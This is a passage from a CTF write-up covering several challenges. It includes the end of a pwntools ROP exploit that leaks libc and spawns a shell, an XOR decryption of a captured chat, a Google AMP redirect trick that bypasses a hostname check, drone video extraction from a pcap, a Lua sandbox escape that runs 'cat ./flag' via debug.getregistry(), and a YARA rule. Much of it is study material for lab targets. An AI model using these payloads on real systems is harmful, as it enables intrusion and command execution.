</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>libc_add <span style="color:#f92672">=</span> unpack(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;libc leaked : </span><span style="color:#e6db74">{</span>hex(libc_add)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Choose an action.&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter new name.&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_add<span style="color:#f92672">-</span><span style="color:#ae81ff">0x29d90</span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(libc)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>system(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(canary)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000029cd6</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> rop<span style="color:#f92672">.</span>chain()
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#--------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><!-- raw HTML omitted -->
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/f1ef7400-45c9-4280-af4d-2e9b33d9747e"></p>
<p>@Capang proud of this :D</p>
<h1 id="revcs1338-script-programming">Rev/CS1338: Script Programming<a hidden class="anchor" aria-hidden="true" href="#revcs1338-script-programming">#</a></h1>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/0d5f6ee7-5b36-48fa-8de2-a42a96f3dcb6"></p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/88e3fbcd-01f1-4b0f-8fc2-0a4b20403711"></p>
<p>Given the lua file, we know that it shows the source code of the instance and we are required to connect to the instance and send the correct string in order to get the flag. From the source code, we can see that it loads a file named library.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/19b83fbe-001b-4c42-ad58-e83641a02a46"></p>
<p>We tried online decompiler for lua but failed, so ended up using an open source compiler that we learned from <a href="https://www.youtube.com/watch?v=nQR1raNkd2s">https://www.youtube.com/watch?v=nQR1raNkd2s</a>.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/e6f88783-f3d0-4860-8d6a-152e4930b4f7"></p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/7aed4f77-0b0e-4b02-9a80-a7991e928c8c"></p>
<h1 id="revsecure-chat">Rev/Secure Chat<a hidden class="anchor" aria-hidden="true" href="#revsecure-chat">#</a></h1>
<p>We are given server.exe, client.exe and OfficeChat.pcapng. The server.exe act as the server for communication, and the client will be acting as the client who start the conversation. This can be seen in the pcap file</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/9e17b0a9-00f8-4fc1-b7b1-97c044d40e8d"></p>
<p>The high port number is the client. We can verify this by trying to capture loopback address on our system.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/bc0fd7d7-5463-4bbe-8f41-9710dde4b504"></p>
<h3 id="reversing-serverexe">Reversing server.exe<a hidden class="anchor" aria-hidden="true" href="#reversing-serverexe">#</a></h3>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/34d47ef0-1de4-4f42-b760-ef107e8ac53e"></p>
<p>The communication process of the server</p>
<ol>
<li>Open socket</li>
<li>Accept session</li>
<li>Generate key</li>
<li>Share key with client</li>
<li>Start secure conversation</li>
</ol>
<h3 id="reversing-clientexe">Reversing client.exe<a hidden class="anchor" aria-hidden="true" href="#reversing-clientexe">#</a></h3>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/2be570e7-1084-4715-bb75-2043389bf274"></p>
<p>The communication process of the client</p>
<ol>
<li>Open socket</li>
<li>Start a session with server</li>
<li>Receive key from server</li>
<li>Start secure communication</li>
</ol>
<p>Things that we can take note</p>
<ol>
<li>KEY is generated by the server</li>
<li>KEY will be shared to the client on network</li>
</ol>
<h3 id="understanding-how-the-key-being-shared-on-network">Understanding how the KEY being shared on network<a hidden class="anchor" aria-hidden="true" href="#understanding-how-the-key-being-shared-on-network">#</a></h3>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/c3125e37-e7e0-4a73-aa6e-dca866197ef3"></p>
<p>Before the key is sent on the network, it is encrypted using XOR with kek variable.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/f636ff5b-06f8-44b0-92e8-b265ce2264b2"></p>
<p>This mean, from the given pcap file, we can decrypt the KEY being used by XORing the encrypted key with kek</p>
<p>Decrypted Key</p>
<pre tabindex="0"><code>0x9e, 0x96, 0xba, 0x9e, 0xf7, 0x36, 0xc8, 0xd8, 0xf7, 0x08, 0x3a, 0xa2, 0xae, 0xc3, 0xfd, 0x35
</code></pre><p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/d08257a4-b52d-4d1e-b8e8-18ad23be77cf"></p>
<p>The secure conversation is being encrypted using the same XOR method. Now we got the key, we just extract the data, then decrypt using our key.</p>
<!-- raw HTML omitted -->
<pre tabindex="0"><code>e6000000
d3f9c8f09e58aff4d7455bd0c5e2dd6cfbf7d2b2d77fe8af92664e82daab8f5aebf1d2be9a59bbacd7675c82daab9858b0b6eef69244ad79587b1acdc0a6dd56ffe5dfbe835ea9acd7665fc7cab0dd53ebe4cef69244e8bb9b6948cbc8aa9e54eaffd5f0db16aaad83284ecacbe38f50ede29af29859a3f8906755c680e3b49431fad6be8744a7ba966a56db8ea5945bfffad3e49216bcb092651ac0d7e3895df7e59aff9142adaa996755cc80e3aa5dffe29aff9559bdacd77155d791e3b55ae93715edd742a0bdd76b56cbcbad8915eef9c8ea9159a4b198285bd7caaa8915f9f9d3f09009
b4000000
c7f3dbf6db1681f884694d82daab9815fbfbdbf79b18e891832849c7cbae8e15f2ffd1fbd741ad7958645682c0a69851bef79afd9843b8b4922855c48eae9850eaffd4f98416bcb7d76f5582c1b59847bee2d2fbd752adac966156d18eb49441f6b6cef69216abb79a7856cbcfad9e50bee2dfff9a18e88f92285ecdc0625241bee1dbf08316bcb7d76553d1dde39c5be7e2d2f79951e8b19a7855d0daa29341bee1d3ea9f16bcb0927b5f82cdab9c5bf9f3c9b0
02010000
d1fe96be835eadf881694fcedafcdd6cfbf7d2b2d77fe8b0966c1ad6c1e38f50edf3cebe9e42e8b4967b4e82d9a6985ebef7dcea9244e8ac9f6d1ad1d7b08950f3b6cfee9357bcbdd92876c7dae39050bee2d2f7995de6f6d92878c7c8ac8f50bedf9af99242e8ac9f694e82c8ac8f15e7f9cfb2d752a1bcd77155d78ea5945bf7e5d2be8553beb1927f53ccc9e3895dfbb6d6f19658e8aa927855d0dae39b47f1fb9aea9f53e8aa92695682cbb08954eaf39afa9246a9aa83655fccdafcdd61f6f3c33f5844adf8806953d6c7ad9a15f1f89af18244e8be926d5ec0cfa09615eaf99aee8559abbd926c1ad5c7b79515ffb6d8f79016bcaa966649c3cdb7945af0b8
c7000000
d9e4dfff831ae8ac9f6954c9ddeddd74f2e4d3f99f42e4f883605f82c0a68a15eef7c9ed8059babcd76e55d08eb79550bee0dbeb9b42e8b1842818e3ed908671aec9f4f1a369bd8bc4576292dc9c9b05ccc9dfd0946491a8c03955ccf1f7b172aee48bca9f7bb5fad92870d7ddb7dd58fffddfbe8443babdd77155d78eb68d51ffe2dfbe8e59bdaad77a5fc1c1b19946bef7d4fad752a7b656a74e82ddab9c47fbb6d3ead741a1ac9f285bccd7ac9350bef3d6ed9216a7ad837b53c6cbe3895dfbb6cefb965be6
1a000000
cef3c8f89255bcf6d75c5bcec5e3895abeefd5ebd745a7b79929
</code></pre><!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>kek <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x9F</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xB2</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x1D</span>, <span style="color:#ae81ff">0xA9</span>, <span style="color:#ae81ff">0xB0</span>, <span style="color:#ae81ff">0x0D</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0xD6</span>, <span style="color:#ae81ff">0x3C</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x1E</span>] <span style="color:#75715e">#16</span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x9e</span>, <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0x9e</span>, <span style="color:#ae81ff">0xf7</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0xc8</span>, <span style="color:#ae81ff">0xd8</span>, <span style="color:#ae81ff">0xf7</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0xae</span>, <span style="color:#ae81ff">0xc3</span>, <span style="color:#ae81ff">0xfd</span>, <span style="color:#ae81ff">0x35</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>secret <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0xd9</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0x1a</span>,<span style="color:#ae81ff">0xe8</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0x54</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0xdd</span>,<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0xdd</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0xf2</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0xd3</span>,<span style="color:#ae81ff">0xf9</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0xf8</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0x60</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x82</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0xa6</span>,<span style="color:#ae81ff">0x8a</span>,<span style="color:#ae81ff">0x15</span>,<span style="color:#ae81ff">0xee</span>,<span style="color:#ae81ff">0xf7</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0xbc</span>,<span style="color:#ae81ff">0xd7</span>,<span style="color:#ae81ff">0x6e</span>,<span style="color:#ae81ff">0x55</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x8e</span>,<span style="color:#ae81ff">0xb7</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0xbe</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0xdb</span>,<span style="color:#ae81ff">0xeb</span>,<span style="color:#ae81ff">0x9b</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0xe8</span>,<span style="color:#ae81ff">0xb1</span>,<span style="color:#ae81ff">0x84</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0xe3</span>,<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0x90</span>,<span style="color:#ae81ff">0x86</span>,<span style="color:#ae81ff">0x71</span>,<span style="color:#ae81ff">0xae</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0xf4</span>,<span style="color:#ae81ff">0xf1</span>,<span style="color:#ae81ff">0xa3</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0xc4</span>,<span style="color:#ae81ff">0x57</span>,<span style="color:#ae81ff">0x62</span>,<span style="color:#ae81ff">0x92</span>,<span style="color:#ae81ff">0xdc</span>,<span style="color:#ae81ff">0x9c</span>,<span style="color:#ae81ff">0x9b</span>,<span style="color:#ae81ff">0x05</span>,<span style="color:#ae81ff">0xcc</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x94</span>,<span style="color:#ae81ff">0x64</span>,<span style="color:#ae81ff">0x91</span>,<span style="color:#ae81ff">0xa8</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0x39</span>,<span style="color:#ae81ff">0x55</span>,<span style="color:#ae81ff">0xcc</span>,<span style="color:#ae81ff">0xf1</span>,<span style="color:#ae81ff">0xf7</span>,<span style="color:#ae81ff">0xb1</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0xae</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0xca</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0x7b</span>,<span style="color:#ae81ff">0xb5</span>,<span style="color:#ae81ff">0xfa</span>,<span style="color:#ae81ff">0xd9</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0x70</span>,<span style="color:#ae81ff">0xd7</span>,<span style="color:#ae81ff">0xdd</span>,<span style="color:#ae81ff">0xb7</span>,<span style="color:#ae81ff">0xdd</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xfd</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0xbe</span>,<span style="color:#ae81ff">0x84</span>,<span style="color:#ae81ff">0x43</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0xd7</span>,<span style="color:#ae81ff">0x71</span>,<span style="color:#ae81ff">0x55</span>,<span style="color:#ae81ff">0xd7</span>,<span style="color:#ae81ff">0x8e</span>,<span style="color:#ae81ff">0xb6</span>,<span style="color:#ae81ff">0x8d</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0xbe</span>,<span style="color:#ae81ff">0x8e</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0xaa</span>,<span style="color:#ae81ff">0xd7</span>,<span style="color:#ae81ff">0x7a</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xb1</span>,<span style="color:#ae81ff">0x99</span>,<span style="color:#ae81ff">0x46</span>,<span style="color:#ae81ff">0xbe</span>,<span style="color:#ae81ff">0xf7</span>,<span style="color:#ae81ff">0xd4</span>,<span style="color:#ae81ff">0xfa</span>,<span style="color:#ae81ff">0xd7</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0xa7</span>,<span style="color:#ae81ff">0xb6</span>,<span style="color:#ae81ff">0x56</span>,<span style="color:#ae81ff">0xa7</span>,<span style="color:#ae81ff">0x4e</span>,<span style="color:#ae81ff">0x82</span>,<span style="color:#ae81ff">0xdd</span>,<span style="color:#ae81ff">0xab</span>,<span style="color:#ae81ff">0x9c</span>,<span style="color:#ae81ff">0x47</span>,<span style="color:#ae81ff">0xfb</span>,<span style="color:#ae81ff">0xb6</span>,<span style="color:#ae81ff">0xd3</span>,<span style="color:#ae81ff">0xea</span>,<span style="color:#ae81ff">0xd7</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xa1</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0x5b</span>,<span style="color:#ae81ff">0xcc</span>,<span style="color:#ae81ff">0xd7</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x93</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0xbe</span>,<span style="color:#ae81ff">0xf3</span>,<span style="color:#ae81ff">0xd6</span>,<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0x92</span>,<span style="color:#ae81ff">0x16</span>,<span style="color:#ae81ff">0xa7</span>,<span style="color:#ae81ff">0xad</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0x7b</span>,<span style="color:#ae81ff">0x53</span>,<span style="color:#ae81ff">0xc6</span>,<span style="color:#ae81ff">0xcb</span>,<span style="color:#ae81ff">0xe3</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0x5d</span>,<span style="color:#ae81ff">0xfb</span>,<span style="color:#ae81ff">0xb6</span>,<span style="color:#ae81ff">0xce</span>,<span style="color:#ae81ff">0xfb</span>,<span style="color:#ae81ff">0x96</span>,<span style="color:#ae81ff">0x5b</span>,<span style="color:#ae81ff">0xe6</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(secret)):
</span></span><span style="display:flex;"><span>    enc <span style="color:#f92672">=</span> secret[i]
</span></span><span style="display:flex;"><span>    enc2 <span style="color:#f92672">=</span> key[i <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span>]
</span></span><span style="display:flex;"><span>    tmp <span style="color:#f92672">=</span> enc <span style="color:#f92672">^</span> enc2
</span></span><span style="display:flex;"><span>    flag<span style="color:#f92672">.</span>append(chr(tmp))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(flag))
</span></span></code></pre></div><!-- raw HTML omitted -->
<blockquote>
<p>Flag : ACS{D0_NoT_uS3_X0r_f0R_eNcRYp71on_4LG0r1ThM}</p>
</blockquote>
<h1 id="webcan-you-redirect-me">Web/Can You REDIRECT Me<a hidden class="anchor" aria-hidden="true" href="#webcan-you-redirect-me">#</a></h1>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/5c5cd6fb-d1d8-44c4-880f-b2b4f5cefee0"></p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/79e686e2-ed44-49b5-9554-ce8d516c11de"></p>
<p>We were greeted with a page with almost nothing in it. Except for the provided url parameters:
?url=Report_URL</p>
<p>Let’s take a deeper look into the source code given and perform code analysis/audit.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/6295d402-ada0-4ca0-bacb-2baab98da91e"></p>
<p>app.js and utils.js seem like the only relevant files for the challenge. Let’s dissect it real quick.</p>
<p>The framework of the web app is very similar to the several other web challenges, of which are based on Express (NodeJS) and includes Puppeteer methods in its codebase.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/fbd57e53-da36-4283-a7b2-4eeb895b7931"></p>
<p>There’s nothing really interesting in the utils.js file, except that now we’ve learned the Puppeteer session will be utilizing the goto method, which navigates the headless Chrome browser to the url fed by the user</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/6faa526c-cf7e-46e3-80f5-a5c66f7417ba"></p>
<p>Route Overview:</p>
<p>The <code>/report</code> route expects a query parameter url. It checks if the URL&rsquo;s hostname is <a href="https://www.google.com">www.google.com</a>. If the condition fails, it responds with I ONLY trust GOOGLE.</p>
<p>Critical Checks:</p>
<pre tabindex="0"><code>Hostname Check: url.hostname != &#34;www.google.com&#34;. This ensures the hostname is strictly www.google.com.
Protocol Check: url.protocol != &#34;http:&#34; &amp;&amp; url.protocol != &#34;https:&#34;. Only http: or https: protocols are allowed.
Bot Processing: The bot visits the provided URL. If the final URL&#39;s hostname isn&#39;t www.google.com, the flag is displayed.
</code></pre><p>URLs that don&rsquo;t have the URL protocol; http or https that are being passed onto the parameter will result in the output NOPE!</p>
<p>The trick was to pass the hostname validation but somehow make the bot end up on a different hostname. Immediately, I remembered something about Google AMP (Accelerated Mobile Pages). If you hit a URL like this; <a href="https://google.com/amp/facebook.com">https://google.com/amp/facebook.com</a>. It passes the hostname check (<a href="https://www.google.com">www.google.com</a>), but when visited, it redirects to facebook.com. Jackpot!</p>
<p>Execution: Hit the /report endpoint with the payload /report?url=https://www.google.com/amp/facebook.com</p>
<p>The server validated the hostname as <a href="https://www.google.com">www.google.com</a>. The bot visited the URL, got redirected by Google AMP to facebook.com. The final check failed because of facebook.com != <a href="https://www.google.com">www.google.com</a>, so the app returned the flag in the JavaScript alert.</p>
<blockquote>
<p>Flag: ACS{It_i5_JU$7_tr1Cky_tRiCK}</p>
</blockquote>
<h1 id="miscdrone-hijacking">Misc/Drone Hijacking<a hidden class="anchor" aria-hidden="true" href="#miscdrone-hijacking">#</a></h1>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/0a3c7464-0943-4e4f-b079-6b6008a980f3"></p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/ad260165-e014-464a-a72d-ee540b3efad5"></p>
<p>We are given a pcap file with RTP streams. Since it is a drone, we suspect that there might be video streaming. There’s a way to convert RTP to H264 manually in Wireshark according to this <a href="https://stackoverflow.com/questions/26164442/decoding-rtp-payload-as-h264-using-wireshark">forum</a>. H.264 is a video compression standard. The goal is to convert to H264 so that we can view the video. In Edit -&gt; Preferences, set the payload type to 96</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/5e9b78ee-501a-4e52-bce0-5175f42dfcef"></p>
<p>Then, we will see that RTP stream has been converted to H264. We can install Wireshark plugin to extract H.264 stream from the RTP stream.</p>
<p>Here’s the plugin that I found:
<a href="https://github.com/volvet/h264extractor/blob/master/rtp_h264_extractor.lua">https://github.com/volvet/h264extractor/blob/master/rtp_h264_extractor.lua</a></p>
<p>Just put into the plugin folder where we install our Wireshark and the plugin will appear in Tools section.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/944885e1-a02b-4cca-a153-e1edd0f04bd0"></p>
<p>We will get .264 file, and we can use ffmpeg to convert it to mp4.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/1d53d7e9-fcad-4aab-aa27-bb0c34918005"></p>
<h1 id="misclutella">Misc/Lutella<a hidden class="anchor" aria-hidden="true" href="#misclutella">#</a></h1>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/2cfa7bd5-8b8a-4718-ad71-f444a44acb45"></p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/e99e3050-4170-4098-9ce4-855fff0e02e2"></p>
<p>In this challenge, we were tasked with exploiting a Lua-based sandbox environment that had several restrictions, particularly on system calls and sensitive libraries. The goal was to find a way to escape the sandbox and retrieve the flag.</p>
<p>Lua is a lightweight, high-level scripting language commonly embedded in applications to provide extensible scripting capabilities. It is known for its simplicity and flexibility, but in this challenge, we were working with a sandboxed Lua environment, meaning that our access to certain functions and libraries was restricted.</p>
<p>Typically, a sandbox in Lua might restrict access to the following:</p>
<p>System-level functions like os.execute(), os.popen(), and io.popen().
The debug library, which can be used for introspection and manipulation of Lua&rsquo;s internal state.
The ability to interact with the file system.</p>
<p>In this environment, we were given limited access to the Lua language but could exploit certain exposed functionalities to break out of the sandbox.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/380b03dd-a648-42fe-9585-9f5a7434e068"></p>
<p>The crux of the exploit involved using Lua&rsquo;s debug library and the internal debug.getregistry() function. The sandbox restricted access to system libraries like os and io, but we were able to bypass these restrictions by directly interacting with Lua&rsquo;s internal registry.</p>
<p>We start by calling the debug.getregistry() function, which returns a global registry table that Lua uses to manage all objects internally. This registry is usually inaccessible in a sandboxed environment, but it wasn’t properly restricted here. By accessing the registry, we were able to locate internal functions and libraries that were not otherwise exposed.</p>
<p>Within the registry, there was an exposed popen function, which allows us to execute system commands. This was a critical vulnerability because it provided a way to interact with the underlying operating system, despite the sandbox restrictions. Normally, Lua’s io.popen or os.popen would be restricted, but by leveraging the registry, we could access and use this function to run shell commands.</p>
<p>Considering typical Lua sandbox escape techniques, I first tried to exploit the debug.getregistry() function. The idea was to look for unsafe methods or libraries available in the registry.</p>
<p>debug.getregistry().safe_method.popen(&ldquo;cat ./flag&rdquo;):</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/0135b2c9-1dc7-4a82-9314-e92cc60789b3"></p>
<p>However, this command failed, as the prompt did not return the flag or any meaningful output.</p>
<p>After further testing, I adjusted the approach and used the print function to display the result explicitly:</p>
<pre tabindex="0"><code>print(debug.getregistry().safe_method.popen(&#34;cat ./flag&#34;):read(&#34;*a&#34;))
</code></pre><p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/aaad2671-cb34-48d7-9136-ba67e1ab0fbd"></p>
<blockquote>
<p>Flag: ACS{Toast_and_chocolate_are_a_fantastic_combination}</p>
</blockquote>
<h1 id="mischi-alien">Misc/Hi Alien<a hidden class="anchor" aria-hidden="true" href="#mischi-alien">#</a></h1>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/4a5b571e-b968-41a0-b8d2-106faee97ab9"></p>
<p>In the website given, we are allowed to upload a file. However, the challenge also provides us with YARA rules.</p>
<!-- raw HTML omitted -->
<pre tabindex="0"><code>import &#34;pe&#34;
import &#34;math&#34;
import &#34;hash&#34;

rule acs_rule {
    meta:
        description = &#34;ACS&#34;
        author = &#34;ACS&#34;
        date = &#34;05/11/2024&#34;
        version = &#34;1.0&#34;

    strings:
        $acs = { 90 90 90 90 68 ?? ?? ?? ?? C3 }

    condition:
        uint16(0) == 0x5A4D and
        math.entropy(0, filesize) &gt; 6 and
        pe.is_32bit() == 0 and
        pe.version_info[&#34;CompanyName&#34;] == &#34;acs&#34; and
        pe.number_of_imported_functions == 62 and
        pe.imports(&#34;acs.dll&#34;) == 3 and
        pe.number_of_resources == 1 and
        pe.number_of_sections == 23 and
        $acs and
        $acs in ((pe.sections[pe.section_index(&#34;.acs&#34;)].raw_data_offset) .. (pe.sections[pe.section_index(&#34;.acs&#34;)].raw_data_offset + pe.sections[pe.section_index(&#34;.acs&#34;)].raw_data_size)) and
        for any section in pe.sections : (
            section.name == &#34;.acs&#34; and
            math.deviation(section.raw_data_offset, section.raw_data_size, math.MEAN_BYTES) &gt; 61.8 and
            math.deviation(section.raw_data_offset, section.raw_data_size, math.MEAN_BYTES) &lt; 61.9 and
            $acs at section.raw_data_offset + 0x2f
        ) or
        hash.md5(0, filesize) == &#34;33baf1c19ca30dac4617dbab5f375efd&#34;
}
</code></pre><!-- raw HTML omitted -->
<!-- raw HTML omitted -->
